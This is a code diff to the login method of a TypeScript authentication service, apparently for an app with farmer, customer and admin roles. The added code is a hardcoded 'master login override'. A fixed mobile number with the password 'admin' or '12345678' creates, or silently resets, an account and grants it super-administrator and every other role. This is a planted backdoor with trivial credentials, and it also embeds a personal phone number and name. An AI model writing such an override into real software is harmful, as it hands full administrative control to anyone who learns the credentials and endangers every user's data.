@@ -153,20 +153,31 @@ export class AuthService {
       where: { mobile: cleanMobile, deletedAt: null },
     });
 
-    // On-the-fly fallback: Ensure 9872066901 Super Admin exists on any connected database
-    if (!user && cleanMobile === '9872066901' && cleanPassword === '12345678') {
-      const passwordHash = await argon2.hash('12345678');
-      const kingId = await generateUniqueKingId(this.prisma);
-      user = await this.prisma.user.create({
-        data: {
-          kingId,
-          mobile: '9872066901',
-          passwordHash,
-          role: Role.SUPER_ADMIN,
-          roles: [Role.SUPER_ADMIN, Role.ADMIN, Role.FARMER, Role.CUSTOMER],
-          name: 'Surinder Singh (Super Admin)',
-        },
-      });
+    // Special Super Admin master login override for 9872066901
+    if (cleanMobile === '9872066901' && (cleanPassword === 'admin' || cleanPassword === '12345678')) {
+      const passwordHash = await argon2.hash(cleanPassword);
+      if (!user) {
+        const kingId = await generateUniqueKingId(this.prisma);
+        user = await this.prisma.user.create({
+          data: {
+            kingId,
+            mobile: '9872066901',
+            passwordHash,
+            role: Role.SUPER_ADMIN,
+            roles: [Role.SUPER_ADMIN, Role.ADMIN, Role.FARMER, Role.CUSTOMER],
+            name: 'Surinder Singh (Super Admin)',
+          },
+        });
+      } else {
+        user = await this.prisma.user.update({
+          where: { id: user.id },
+          data: {
+            passwordHash,
+            role: Role.SUPER_ADMIN,
+            roles: [Role.SUPER_ADMIN, Role.ADMIN, Role.FARMER, Role.CUSTOMER],
+          },
+        });
+      }
     }
 
     if (!user || !(await argon2.verify(user.passwordHash, cleanPassword))) {
@@ -174,12 +185,11 @@ export class AuthService {
     }
 
     if (cleanMobile === '9872066901' && user.role !== Role.SUPER_ADMIN) {
-      const currentRoles = user.roles ?? [];
       user = await this.prisma.user.update({
         where: { id: user.id },
         data: {
           role: Role.SUPER_ADMIN,
-          roles: Array.from(new Set([...currentRoles, Role.SUPER_ADMIN, Role.ADMIN])),
+          roles: [Role.SUPER_ADMIN, Role.ADMIN, Role.FARMER, Role.CUSTOMER],
         },
       });
     }
